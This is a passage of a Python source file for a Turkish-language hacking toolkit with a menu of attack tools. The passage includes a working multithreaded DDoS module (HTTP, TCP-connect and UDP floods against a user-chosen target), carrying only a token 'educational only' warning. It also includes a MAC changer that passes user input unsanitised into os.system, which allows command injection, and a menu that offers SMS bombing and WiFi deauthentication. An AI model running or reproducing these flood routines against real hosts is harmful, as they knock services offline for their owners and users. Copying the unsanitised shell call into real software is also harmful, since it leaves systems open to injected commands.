    clear_screen(); baslik("MAC ADDRESS CHANGER")
    if System == "Windows": fail("Linux gerekli!"); input(f"  {Y}ENTER{S} "); return "Home"
    if not Root: fail("Root gerekli!"); input(f"  {Y}ENTER{S} "); return "Home"
    interface = sor_arayuz()
    if not interface: return "Home"
    secim = secim_menu([("1","Rastgele MAC"), ("2","Ozel MAC"), ("0","Geri")])
    if secim == "0": return "Home"
    sudo = "" if System == "Windows" else "sudo "
    if secim == "1":
        mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        os.system(f"{sudo}ifconfig {interface} down; {sudo}ifconfig {interface} hw ether {mac}; {sudo}ifconfig {interface} up")
        ok(f"Yeni MAC: {mac}")
    elif secim == "2":
        mac = soru("MAC adresi (0=iptal)")
        if not mac: return "Home"
        os.system(f"{sudo}ifconfig {interface} down; {sudo}ifconfig {interface} hw ether {mac}; {sudo}ifconfig {interface} up")
        ok(f"Yeni MAC: {mac}")
    input(f"  {Y}ENTER{S} "); return "Home"

def ddos_tool():
    clear_screen(); baslik("DDoS TOOL (LAYER 7)")
    warn("SADECE EGITIM AMACLIDIR!")
    hedef_ip = soru("Hedef IP/Domain (0=iptal)")
    if not hedef_ip: return "Home"
    port = soru("Hedef Port", "80")
    if not port: return "Home"
    try: port = int(port)
    except: fail("Gecersiz port!"); bekle(); return "Home"
    secim = secim_menu([("1","HTTP Flood"), ("2","SYN Flood"), ("3","UDP Flood"), ("0","Geri")])
    if secim == "0": return "Home"
    thread_s = soru("Thread sayisi", "100")
    try: thread_s = int(thread_s)
    except: thread_s = 100
    aktif = True

    def http_f():
        while aktif:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
                s.connect((hedef_ip, port)); s.send(f"GET / HTTP/1.1\r\nHost: {hedef_ip}\r\n\r\n".encode()); s.close()
            except: pass

    def syn_f():
        while aktif:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
                s.connect_ex((hedef_ip, port))
            except: pass

    def udp_f():
        while aktif:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(512), (hedef_ip, port)); s.close()
            except: pass

    funcs = {"1": http_f, "2": syn_f, "3": udp_f}
    if secim not in funcs: fail("Gecersiz!"); bekle(); return "Home"
    ok(f"{hedef_ip}:{port} -> {thread_s} thread"); warn("CTRL+C durdurur\n")
    threads = [threading.Thread(target=funcs[secim], daemon=True) for _ in range(thread_s)]
    for t in threads: t.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        aktif = False; ok("Durduruldu.")
    input(f"  {Y}ENTER{S} "); return "Home"

# --| Bagimlilik Kontrolu |-- #
def bagimlilik_kontrol():
    eksik = []
    try:
        import scapy
    except ImportError:
        eksik.append("scapy")
    try:
        import colorama
    except ImportError:
        eksik.append("colorama")
    if eksik:
        print(f"{Y}  Eksik paketler:{S} {', '.join(eksik)}")
        r = input(f"  {Y}Otomatik kurulsun mu?{S} (E/h): ").strip().lower()
        if r in ("", "e", "evet", "y", "yes"):
            for p in eksik:
                info(f"{p} kuruluyor...")
                subprocess.run([sys.executable, "-m", "pip", "install", p], capture_output=True)
            ok("Paketler kuruldu.")
    if OS == "Windows":
        import ctypes
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall") as k:
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        n = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        v = winreg.QueryValueEx(n, "DisplayName")[0]
                        if "Npcap" in v:
                            return
                    except:
                        pass
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall") as k:
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        n = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        v = winreg.QueryValueEx(n, "DisplayName")[0]
                        if "Npcap" in v:
                            return
                    except:
                        pass
        except:
            pass
        warn("Npcap bulunamadi! Bazi ag islemleri calismayabilir.")
        info("install.ps1 dosyasini YONETICI olarak calistirin:")
        info("  PowerShell'i Yonetici olarak acin:")
        info("  Set-ExecutionPolicy Bypass -Scope Process -Force")
        info("  .\install.ps1\n")

bagimlilik_kontrol()

# --| Ana Menu |-- #
while True:
    clear_screen()
    if Location == "Home":
        print(G + """
     █████╗ ██╗  ██╗████████╗
    ██╔══██╗██║  ██║╚══██╔══╝
    ███████║███████║   ██║   
    ██╔══██║██╔══██║   ██║   
    ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   """ + S + f"""
    {Y}  version 1.0b - Alperen Buba{S}
""")
        durum_cubugu(); print()
        secim = secim_menu([
            ("1","SMS Bomber"), ("2","WiFi Deauth"), ("3","Network Tools"),
            ("4","IP Geolocation"), ("5","Port Scanner"), ("6","MAC Changer"),
            ("7","DDoS Tool"), ("0","Cikis"),
        ])
        match secim:
            case "1": Location = "sms_bomber"
            case "2": Location = "wifi_deauth"
            case "3": Location = "bettercap"
            case "4": Location = "ip_geolocation"
            case "5": Location = "port_scanner"
            case "6": Location = "mac_changer"
            case "7": Location = "ddos_tool"
            case "0": clear_screen(); sys.exit(0)
            case _: input(f"  {R}Gecersiz!{S} {Y}ENTER{S} ")

    elif Location == "sms_bomber": Location = sms_bomber()
    elif Location == "wifi_deauth": Location = wifi_deauth()
    elif Location == "bettercap": Location = bettercap_menu()
    elif Location == "ip_geolocation": Location = ip_geolocation()
    elif Location == "port_scanner": Location = port_scanner()
    elif Location == "mac_changer": Location = mac_changer()
    elif Location == "ddos_tool": Location = ddos_tool()
